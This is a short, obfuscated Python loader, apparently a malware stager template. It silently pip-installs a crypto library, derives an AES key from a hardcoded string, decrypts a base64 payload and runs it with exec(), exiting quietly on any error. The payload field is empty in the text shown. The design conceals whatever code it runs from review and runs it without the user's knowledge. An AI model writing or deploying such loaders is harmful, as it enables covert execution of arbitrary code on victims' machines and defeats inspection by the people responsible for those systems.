import base64 as iNKJn, hashlib, sys, os
try:
    from Crypto.Cipher import AES as gDOQf
    from Crypto.Util.Padding import unpad as zYkpg
except:
    null_dev = "NUL" if os.name == "nt" else "/dev/null"
    os.system(f"{sys.executable} -m pip install pycryptodome > {null_dev} 2>&1")
    try:
        from Crypto.Cipher import AES as gDOQf
        from Crypto.Util.Padding import unpad as zYkpg
    except: sys.exit(1)

kVVBV = ""
gqxkE = hashlib.sha256("XIXWqMtCsgjXSviifJgMjYMRHGpppVxh".encode()).digest()

try:
    raw = iNKJn.b64decode(kVVBV)
    cipher = gDOQf.new(gqxkE, gDOQf.MODE_CBC, raw[:16])
    WkWDg = zYkpg(cipher.decrypt(raw[16:]), 16).decode('utf-8')
    exec(WkWDg, globals())
except Exception: sys.exit(0)
